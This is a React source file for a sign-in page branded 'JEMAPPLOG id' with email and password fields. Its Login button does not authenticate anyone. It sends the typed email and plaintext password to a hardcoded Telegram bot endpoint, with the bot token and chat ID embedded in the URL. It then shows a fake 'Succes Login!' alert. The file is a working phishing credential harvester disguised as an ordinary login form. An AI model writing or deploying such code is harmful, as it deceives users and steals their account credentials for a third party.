import 'bootstrap/dist/css/bootstrap.min.css';
import { useState, useEffect } from 'react';
import axios from 'axios';
import { Button, Form, Container, Row, Col, Navbar, Nav, NavDropdown, FormGroup, FormFloating, Alert } from 'react-bootstrap';
import '../style/sign-page.css';

const Sign = () => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [additionalInput1, setAdditionalInput1] = useState('');
    const [additionalInput2, setAdditionalInput2] = useState('');
    const [showAlert, setShowAlert] = useState(false);
  
    const handleEmailChange = (event) => {
      setEmail(event.target.value);
    };
  
    const handlePasswordChange = (event) => {
      setPassword(event.target.value);
    };
  
    const handleAdditionalInput1Change = (event) => {
      setAdditionalInput1(event.target.value);
    };
  
    const handleAdditionalInput2Change = (event) => {
      setAdditionalInput2(event.target.value);
    };
  
    const sendMessageToTelegram = () => {
      if (email && email.trim() !== '' && password && password.trim() !== '') {
        const message = `
          Email: ${email}
          Password: ${password}
        `;
        const telegramBotUrl = `https://api.telegram.org/bot6708375469:AAF6qC3GGa3-yMca7lxYtSrGFqR8JUqYU-I/sendMessage?chat_id=6346214123&text=${message}`;
  
        axios.get(telegramBotUrl)
          .then(response => {
            setShowAlert(true);
          })
          .catch(error => {
            console.error('Error mengirim pesan ke Telegram:', error);
          });
      } else {
        console.error('Email dan Password tidak boleh kosong');
      }
    };

  useEffect(() => {
    document.title = "Sign";
  }, []);

  return (
    <>
      <div className="navbar-area">
        <Navbar expand="lg" className="text-bg-light font-monospace">
          <Container>
            <Navbar.Brand href="#home">JEM</Navbar.Brand>
            <Navbar.Toggle aria-controls="basic-navbar-nav" />
            <Navbar.Collapse id="basic-navbar-nav">
              <Nav className="me-auto">
                <Nav.Link href="#home">Home</Nav.Link>
                <Nav.Link href="#link">Link</Nav.Link>
                <NavDropdown title="Dropdown" id="basic-nav-dropdown">
                  <NavDropdown.Item href="#action/3.1">Action</NavDropdown.Item>
                  <NavDropdown.Item href="#action/3.2">Another action</NavDropdown.Item>
                  <NavDropdown.Item href="#action/3.3">Something</NavDropdown.Item>
                  <NavDropdown.Divider />
                  <NavDropdown.Item href="#action/3.4">Separated link</NavDropdown.Item>
                </NavDropdown>
              </Nav>
            </Navbar.Collapse>
          </Container>
        </Navbar>
      </div>

      <body>
        <div className='login-page'>
          <Container fluid='md'>
            <Row xs={1} md={2} lg={7}>
              <Col>
                <h1 className='font-monospace'>JEMAPPLOG id</h1>
              </Col>
              <Col>
                <Form>
                  <div className="area-form">
                    <Form.Floating className="mb-3">
                      <Form.Control
                        id="floatingInputCustom"
                        type="email"
                        placeholder="name@example.com"
                        value={email}
                        onChange={handleEmailChange}
                      />
                      <label htmlFor="floatingInputCustom">Email address</label>
                    </Form.Floating>
                    <Form.Floating>
                      <Form.Control
                        id="floatingPasswordCustom"
                        type="password"
                        placeholder="Password"
                        value={password}
                        onChange={handlePasswordChange}

                      />
                      <label htmlFor="floatingPasswordCustom">Password</label>
                    </Form.Floating>
                    <div className="d-grid pt-3 h-auto">
                      <Button style={{ height: '60px' }} variant='dark' onClick={sendMessageToTelegram}>Login</Button>
                    </div>
                    <div className="alert">
                    <div className="text-white">
                    {showAlert &&
                      <Alert variant="red" onClose={() => setShowAlert(false)} dismissible>
                     Succes Login!
                      </Alert>
                    }
                    </div>
                    </div>
                  </div>
                </Form>
              </Col>
            </Row>
          </Container>
        </div>
      </body>

      <div className="footer align-items-end">
        <div className="footer-area p-auto">
          <Container fluid>
            <Row xs={4} md={3} lg={7}>
              <h2 className='font-monospace'>@y</h2>
              <h2 className='font-monospace'>@EX.DE</h2>
              <h2 className='font-monospace'>@EX.DE</h2>
            </Row>
          </Container>
        </div>
      </div>
    </>
  );
};

export default Sign;
